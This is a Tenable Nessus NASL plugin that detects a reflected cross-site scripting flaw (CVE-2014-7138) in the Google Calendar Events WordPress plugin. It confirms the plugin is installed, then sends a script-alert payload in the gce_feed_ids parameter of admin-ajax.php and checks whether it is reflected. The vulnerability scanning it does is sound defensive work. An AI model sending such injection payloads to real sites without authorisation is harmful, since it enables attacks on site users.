#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(79385);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/01/16 03:36:09 $");

  script_cve_id("CVE-2014-7138");
  script_bugtraq_id(70370);
  script_osvdb_id(112134);

  script_name(english:"Google Calendar Events Plugin for WordPress 'admin-ajax.php' XSS");
  script_summary(english:"Attempts to inject script code.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is affected by a cross-
site scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the Google Calendar Events plugin for WordPress
installed on the remote host fails to properly sanitize user-supplied
input to the 'gce_feeds_ids' parameter of the 'admin-ajax.php' script
before returning it to users. An attacker can use this to execute
arbitrary script code within the context of the user's browser.");
  script_set_attribute(attribute:"see_also", value:"http://philderksen.com/google-calendar-events-version-2/");
  script_set_attribute(attribute:"see_also", value:"https://wordpress.org/plugins/google-calendar-events/changelog/");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 2.0.4 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/09/17");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/09/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/11/21");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2014-2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(app_name:app, port:port);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "Google Calendar Events";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "google-calendar-events/css/admin.css"][0] =
    make_list('@package +GCE');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

xss_test = "'" + '"><script>alert(' + unixtime() + ')</script>';

exploit = test_cgi_xss(
  port     : port,
  dirs     : make_list(dir),
  cgi      : '/wp-admin/admin-ajax.php',
  qs       : 'action=gce_ajax&gce_type=page&gce_feed_ids=' + urlencode(str:xss_test),
  pass_re  : "gce-month-title",
  pass_str : "<script>alert("
);

if (!exploit) audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
